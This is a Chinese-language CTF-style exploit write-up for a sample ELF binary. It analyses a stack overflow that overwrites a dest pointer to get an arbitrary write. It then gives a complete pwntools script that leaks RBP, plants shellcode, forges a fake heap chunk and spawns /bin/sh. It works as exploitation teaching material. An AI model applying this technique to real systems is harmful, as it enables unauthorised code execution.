# 漏洞利用文档

## 执行环境
基于反编译代码、exp脚本和调试记录分析，程序的执行环境如下：
- **架构**：x86-64 Linux ELF 二进制程序
- **保护机制**：
  - NX（No Execute）可能未启用或部分绕过，因为exp成功在栈上执行shellcode（栈内存具有`rwxp`权限）
  - ASLR（Address Space Layout Randomization）可能启用，但通过RBP泄露绕过
  - 其他保护如PIE（Position Independent Executable）可能未启用，因为exp使用固定偏移计算地址
- **依赖库**：标准C库（libc），但exp主要利用程序自身的漏洞，不直接依赖特定libc版本
- **运行要求**：需要可执行栈内存，程序通过菜单驱动交互（check in/check out/goodbye）

## 漏洞成因
### 关键结构体与代码分析
- **全局变量`ptr`**：用于存储malloc分配的内存地址，在`sub_4008B7`（check in）中分配，在`sub_40096D`（check out）中释放。
- **栈溢出漏洞**：在`sub_400A29`函数中：
  - `buf[56]`数组位于栈上（`rbp-0x40`），但`read(0, buf, 0x40u)`读取64字节，导致栈溢出8字节（64-56）。
  - 溢出覆盖了栈上的`dest`指针（位于`rbp-0x8`），使后续`strcpy(dest, buf)`可向任意地址写数据。
- **漏洞类型**：栈溢出导致任意地址写，结合堆操作（malloc/free）和栈执行，实现代码执行。

### 漏洞触发路径
1. 程序启动后通过`sub_400A8E`读入用户名到栈上`v2[48]`数组。
2. 进入`sub_400A29`，栈溢出覆盖`dest`指针。
3. 通过`strcpy`修改全局变量`ptr`指向栈上的fake chunk。
4. 利用堆操作触发shellcode执行。

## 漏洞利用过程
基于exp步进调试的内存变化，总结如下表：

| 步骤 | 操作描述 | 栈内存变化 | 堆内存变化 | 全局变量`ptr`状态 | 关键地址 |
|------|----------|-------------|-------------|-------------------|-----------|
| **初始状态** | 程序启动，等待输入 | 栈可执行（`rwxp`），未初始化 | 堆未分配 | `0x0`（未设置） | - |
| **Step 1**<br>`leak_rbp_and_get_shellcode_addr` | 注入shellcode并泄露RBP | shellcode写入`0x7ffcffc71ae0`<br>RBP泄露为`0x7ffcffc71ab0` | 无变化 | `0x0` | shellcode_addr = RBP - 0x50 |
| **Step 2**<br>`setup_fake_chunk` | 设置fake chunk并覆盖`dest`指针 | fake chunk构造于`0x7ffcffc71a98`<br>size字段设为`0x41` | 分配chunk（`0x99c9000`） | 修改为指向栈fake chunk（`0x7ffcffc71aa0`） | fake_chunk_addr = shellcode_addr + 0x50 - 0x90 |
| **Step 3**<br>`arbitrary_write` | 通过任意写完善利用链 | fake chunk中写入shellcode指针`0x7ffcffc71ae0` | 无变化 | 保持不变（指向栈） | shellcode_addr写入关键位置 |
| **Step 4**<br>`trigger_shell` | 触发shellcode执行 | 控制流劫持，执行`execve("/bin/sh")` | 堆重新映射（新进程） | 无效（新进程） | 程序替换为`/bin/dash` |
| **Step 5**<br>`p.interactive()` | 进入交互shell | 正常shell栈布局 | 正常shell堆布局 | 无效 | 获得完整shell权限 |

### 内存变化关键点
- **栈执行**：栈内存始终具有`rwxp`权限，允许shellcode执行。
- **地址泄露**：通过溢出泄露RBP，计算shellcode和fake chunk地址。
- **全局变量劫持**：`ptr`被修改指向栈，绕过堆保护。
- **最终状态**：成功执行`/bin/dash`，内存布局切换为新进程的正常状态。

## Exploit
以下是漏洞利用脚本（exp）的完整代码，在关键位置添加注释说明：

```python
from pwn import *

# 设置调试环境和目标程序
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample21')
p = process('./data/sample21')
# 生成x86-64 shellcode用于执行/bin/sh
shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')

def leak_rbp_and_get_shellcode_addr(shellcode):
    # Step 1: 通过栈溢出泄露RBP并计算shellcode地址
    # 将shellcode填充至48字节并发送，覆盖栈上的v2数组
    payload = shellcode.ljust(48)
    p.sendafter(b'who are u?\n', payload)
    p.recvuntil(payload)
    # 泄露RBP地址（6字节），补零为8字节
    rbp_addr = u64(p.recvn(6).ljust(8, b'\x00'))
    # 计算shellcode在栈上的实际地址（基于偏移）
    shellcode_addr = rbp_addr - 0x50
    print("shellcode_addr: ", hex(shellcode_addr))
    return shellcode_addr

def setup_fake_chunk(fake_chunk_addr):
    # Step 2: 设置栈上的fake chunk并覆盖dest指针
    p.sendlineafter(b'give me your id ~~?\n', b'32')
    p.recvuntil(b'give me money~\n')
    # 构造fake chunk数据：5个8字节0 + size字段0x41
    data = p64(0) * 4 + p64(0) + p64(0x41)
    # 填充至56字节，然后覆盖dest指针为fake_chunk_addr
    data = data.ljust(56, b'\x00') + p64(fake_chunk_addr)
    p.send(data)

def arbitrary_write(shellcode_addr):
    # Step 3: 通过任意写操作将shellcode地址写入关键位置
    p.sendlineafter(b'choice : ', b'2')  # 选择check out释放ptr
    p.sendlineafter(b'choice : ', b'1')  # 选择check in重新分配
    p.sendlineafter(b'long?', b'48')     # 设置分配大小
    p.recvline()
    # 构造数据：填充24字节后写入shellcode地址
    data = b'a' * 0x18 + p64(shellcode_addr)
    data = data.ljust(48, b'\x00')
    p.send(data)

def trigger_shell():
    # Step 4: 触发shellcode执行
    p.sendlineafter(b'choice', b'3')  # 选择goodbye退出菜单循环，触发执行

# 主利用流程
shellcode_addr = leak_rbp_and_get_shellcode_addr(shellcode)  # 泄露地址并计算shellcode位置
fake_chunk_addr = shellcode_addr + 0x50 - 0x90  # 计算fake chunk在栈上的地址
setup_fake_chunk(fake_chunk_addr)  # 设置fake chunk并覆盖指针
arbitrary_write(shellcode_addr)    # 通过任意写完善利用链
trigger_shell()                    # 触发shellcode执行
p.interactive()  # 进入交互式shell
```

### 关键注释说明
- **shellcode生成**：使用pwntools的`shellcraft`生成x86-64的`/bin/sh`执行代码。
- **地址计算**：基于泄露的RBP和固定偏移计算关键地址，利用栈布局 predictability。
- **fake chunk构造**：模拟堆chunk结构（size字段0x41），用于欺骗堆操作。
- **任意写利用**：通过覆盖`dest`指针实现任意地址写，修改全局变量`ptr`。
- **触发机制**：选择"goodbye"菜单项退出循环，触发控制流劫持。

此exp成功利用栈溢出和任意写漏洞，在禁用NX或可执行栈的环境中获取shell权限。
